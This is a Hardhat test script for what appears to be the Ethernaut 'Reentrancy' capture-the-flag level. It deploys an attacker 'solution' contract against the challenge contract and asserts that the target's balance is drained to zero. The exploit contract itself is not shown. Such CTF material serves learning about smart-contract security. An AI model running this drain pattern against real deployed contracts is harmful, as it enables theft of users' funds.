const { ethers } = require("hardhat")
const { assert } = require("chai")

/* 
    Enter the contract address below.
    Use `await contract.address in the console to get the address.
*/
const CONTRACT_ADDRESS = "0xd1866307ae147a695F4e24d85FBD0722E7d088F5"

describe("10 Reentrancy", function () {
    let player, challengeContract, solutionContract

    before(async function () {
        ;[player] = await ethers.getSigners()
        challengeContract = await ethers.getContractAt(
            "Reentrance",
            CONTRACT_ADDRESS,
            player
        )
        solutionContract = await (
            await ethers.getContractFactory("ReentranceSolution", player)
        ).deploy(CONTRACT_ADDRESS)
        const balanceBefore = await ethers.provider.getBalance(
            challengeContract.address
        )
        assert.notEqual(balanceBefore.toString(), "0")
    })

    it("Execution", async function () {
        const valueToDonate = await ethers.provider.getBalance(
            challengeContract.address
        )
        const txReponse = await solutionContract.solveChallenge({
            value: valueToDonate,
        })
        await txReponse.wait(1)
    })

    after(async function () {
        const balanceAfter = await ethers.provider.getBalance(
            challengeContract.address
        )
        assert.equal(balanceAfter.toString(), "0")
    })
})
